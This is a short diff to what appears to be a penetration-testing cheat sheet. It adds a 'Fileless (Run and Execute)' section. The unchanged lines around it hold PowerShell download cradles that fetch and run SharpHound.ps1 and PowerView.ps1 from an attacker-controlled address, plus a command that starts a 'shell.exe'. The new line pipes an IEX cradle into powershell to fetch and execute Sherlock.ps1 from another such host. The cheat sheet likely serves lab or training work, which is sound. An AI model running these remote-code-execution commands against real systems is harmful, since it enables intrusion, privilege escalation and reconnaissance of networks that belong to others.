@@ -43,6 +43,11 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/SharpHound.ps1')
 IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerView.ps1')
 ```
 
+## Fileless (Run and Execute)
+```
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.19:8000/Sherlock.ps1') | powershell -noprofile - 
+```
+
 ## Running Executable
 ```
 c:\> start-process shell.exe
